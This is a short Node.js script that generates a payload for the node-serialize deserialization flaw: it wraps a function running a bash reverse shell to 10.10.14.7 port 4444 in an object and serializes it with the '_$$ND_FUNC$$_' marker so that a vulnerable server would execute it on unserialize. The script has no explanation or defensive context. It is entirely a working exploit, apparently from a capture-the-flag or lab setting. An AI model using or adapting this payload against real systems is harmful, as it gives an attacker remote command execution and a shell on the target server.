var exec = require('child_process').exec;

var x = {
test : function(){ require('child_process').execSync("bash -i >& /dev/tcp/10.10.14.7/4444 0>&1", function puts(error, stdout, stderr) {}); }
};


function serialize(obj) {
  var serializedObj = {};
  for (var key in obj) {
    if (typeof obj[key] === 'function') {
      serializedObj[key] = "_$$ND_FUNC$$_" + obj[key].toString();
    } else {
      serializedObj[key] = obj[key];
    }
  }
  return JSON.stringify(serializedObj);
}

var serializedData = serialize(x);
console.log(serializedData);
